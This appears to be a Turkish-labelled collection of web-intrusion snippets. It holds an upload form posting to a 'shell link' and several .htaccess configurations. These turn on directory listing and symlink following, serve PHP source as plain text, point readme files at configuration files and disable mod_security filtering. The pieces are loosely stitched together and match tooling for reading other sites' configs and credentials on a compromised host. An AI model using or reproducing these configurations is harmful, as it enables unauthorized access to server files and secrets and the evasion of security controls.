NewBalamAl.php
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8" />
    <title>Dosya Yükleme Formu</title>
</head>
<body>

    <h2>Dosya Yükleme Formu</h2>
    <form action="shell linki" method="post" enctype="multipart/form-data">
        <label for="file">Dosya seçin:</label>
        <input type="file" name="file" id="file" required />
        <br /><br />
        <button type="submit">Yükle</button>
    </form>

</body>
</html> 

Options Indexes FollowSymLinks
DirectoryIndex ico.phtml
AddType txt .php
AddHandler txt .php
ReadMeName 3.txt




403 

OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI
Options Indexes FollowSymLinks
ForceType text/plain
AddType text/plain .php
AddType text/plain .html
AddType text/html .shtml
AddType txt .php
AddHandler server-parsed .php
AddHandler txt .php
AddHandler txt .html
AddHandler txt .shtml
Options All
Options All
ReadMeName configismi.txt



htcass


Options Indexes FollowSymLinks
DirectoryIndex ssssss.htm
AddType txt .php
AddHandler txt .php
<IfModule mod_autoindex.c> 
IndexOptions FancyIndexing IconsAreLinks SuppressHTMLPreamble 
</ifModule>
<IfModule mod_security.c> 
SecFilterEngine Off 
SecFilterScanPOST Off 
</IfModule>
Options +FollowSymLinks
DirectoryIndex Sux.html
Options +Indexes
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html




